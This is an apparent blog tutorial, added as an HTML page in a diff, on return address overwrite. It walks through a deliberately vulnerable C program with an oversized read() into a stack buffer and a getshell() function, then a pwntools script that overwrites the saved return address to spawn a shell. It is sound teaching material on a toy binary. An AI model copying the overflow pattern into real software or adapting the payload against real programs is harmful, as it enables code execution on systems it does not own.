@@ -1,0 +1,106 @@
+<!doctype html>
+<html lang="en" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE]Return Address Overwrite · whrds.log</title><meta name="description" content="※ If there are any mistakes, please let us know. We will check and correct it. ※ I briefly discussed Buffer OverFlow in the last post. This time, we will cover a technique that attacks the ret part located in the stack frame, which modifies the stack. Stack Frame basically has the above structure.">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/en/posts/pwnable-return-address-overwrite/">
+  <link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-return-address-overwrite/"><link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-return-address-overwrite/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE]Return Address Overwrite · whrds.log"><meta property="og:description" content="※ If there are any mistakes, please let us know. We will check and correct it. ※ I briefly discussed Buffer OverFlow in the last post. This time, we will cover a technique that attacks the ret part located in the stack frame, which modifies the stack. Stack Frame basically has the above structure."><meta property="og:url" content="https://whrds.github.io/en/posts/pwnable-return-address-overwrite/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE]Return Address Overwrite","description":"※ If there are any mistakes, please let us know. We will check and correct it. ※ I briefly discussed Buffer OverFlow in the last post. This time, we will cover a technique that attacks the ret part located in the stack frame, which modifies the stack. Stack Frame basically has the above structure.","datePublished":"2023-09-18","inLanguage":"en","url":"https://whrds.github.io/en/posts/pwnable-return-address-overwrite/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/en/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="/en/" aria-current="page">Notes</a>
+      <a href="/en/about/">About</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="/ko/posts/pwnable-return-address-overwrite/" class="" lang="ko">KO</a>
+        <a href="#" class="active" lang="en" aria-current="true">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE]Return Address Overwrite</h1><p class="article-description">※ If there are any mistakes, please let us know. We will check and correct it. ※ I briefly discussed Buffer OverFlow in the last post. This time, we will cover a technique that attacks the ret part located in the stack frame, which modifies the stack. Stack Frame basically has the above structure.</p><div class="article-meta"><time datetime="2023-09-18">Sep 18, 2023</time><span>·</span><span>3 min read</span></div></header><div class="prose"><p><strong>※ If there are any mistakes, please let me know. We will make corrections after confirmation.</strong> <strong>※</strong> </p>
+<p>In the last post, I briefly discussed Buffer OverFlow.</p>
+<p>This time, we will cover a technique that attacks the ret part located in the stack frame, which modifies the stack.</p>
+<p><img src="/assets/images/tistory/tistory-465ad6c4abda/001.png" alt=""></p>
+<p>Stack Frame basically has the above structure.</p>
+<p>What happens if you input data into buf and enter data larger than buf?</p>
+<p>As long as it is a program without any special verification, input is possible by invading the sfp and ret areas.</p>
+<p>An attack that follows this flow is <strong>Return Address Overwrite</strong>.</p>
+<p>Let’s create a simple example and practice it.</p>
+<pre><code>#include &lt;stdio.h&gt;
+
+void getshell(){
+    execve(&quot;/bin/sh&quot;,0,0);
+}
+
+int main(){
+    int buf[0x30];
+    
+    printf(&quot;Input : &quot;);
+    read(0,buf,0x100);
+
+    return 0;
+}
+</code></pre>
+<p>The above code only performs the function of inputting values through read() in main().</p>
+<p>There are two parts to pay attention to at this time.</p>
+<p>1. There is a function called getshell() that can run a shell.</p>
+<p>2. Looking at main(), you can enter a value larger than the declared 0x30 of the buf array.</p>
+<pre><code>int buf[0x30];
+read(0,buf,0x100);
+</code></pre>
+<p>The above code is usually referred to as a ‘BOF vulnerability.’</p>
+<p>Now, we will proceed with the exercise using the above code.</p>
+<p>First you need to check the size of buf. </p>
+<p>When you just look at the code, you may think that it is generally 0x30,</p>
+<p>An array called buf was created using the int data type, not char.</p>
+<p>Therefore, 0xc0, which is the result of 4 * 0x30 rather than 0x30, becomes the size of buf. </p>
+<p>Calculating through code like this is one way, but since we are studying the system, we will check again through gdb.</p>
+<p><img src="/assets/images/tistory/tistory-465ad6c4abda/002.png" alt=""></p>
+<p>First of all, this is the part where the Stack Frame is created in main().</p>
+<p>Since we already know the size of the buf, we can think of that part as the size/position of the buf.</p>
+<p>Still, we have to check one more time.</p>
+<p>In this example, there is one variable and Canary, one of the stack protection techniques, is set or</p>
+<p>Since there is no need to align the stack, the stack frame and buf will match,</p>
+<p>This is because there are more cases where this is not the case.</p>
+<p><img src="/assets/images/tistory/tistory-465ad6c4abda/003.png" alt=""></p>
+<p>As a result of checking the part where read() was called, buf is also [rbp-0xc0].</p>
+<p><img src="/assets/images/tistory/tistory-465ad6c4abda/004.png" alt=""></p>
+<p>The stack frame is summarized as above.</p>
+<p>Looking at the vulnerability again, data of size 0x100, which is larger than 0xc0, which is the size of buf, is input through read().</p>
+<p>Since the total size of the Stack Frame, including sfp and ret, is 0xd0, an attack is possible by overwriting even the ret part.</p>
+<p>Now we just need to find out which function to use to ret, and we already know the answer.</p>
+<p>This is because there is a function called getshell() that runs the shell.</p>
+<p>The address of the function can be checked through gdb.</p>
+<p><img src="/assets/images/tistory/tistory-465ad6c4abda/005.png" alt=""></p>
+<p>The attack procedure is summarized as follows.</p>
+<p>1. Find out the size of buf</p>
+<p>2. Check address of getshell()</p>
+<p>3. Send buf + sfp + ret (getshell function)</p>
+<p>4. attack success</p>
+<pre><code>from pwn import*
+
+p = process('./return')
+e = ELF('./return')
+
+getshell = e.sym['getshell']
+
+payload = b'a'*0xc0
+payload += b'b'*0x8 
+payload += p64(getshell)
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<p>If you execute the above payload, you can confirm that the attack was performed normally.</p>
+<p><img src="/assets/images/tistory/tistory-465ad6c4abda/006.png" alt=""></p>
+</div><div class="article-end"><a href="/en/">← View all notes</a><a href="/ko/posts/pwnable-return-address-overwrite/" hreflang="ko">Read this post in Korean →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>Observe, verify, document.</span><a href="/en/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
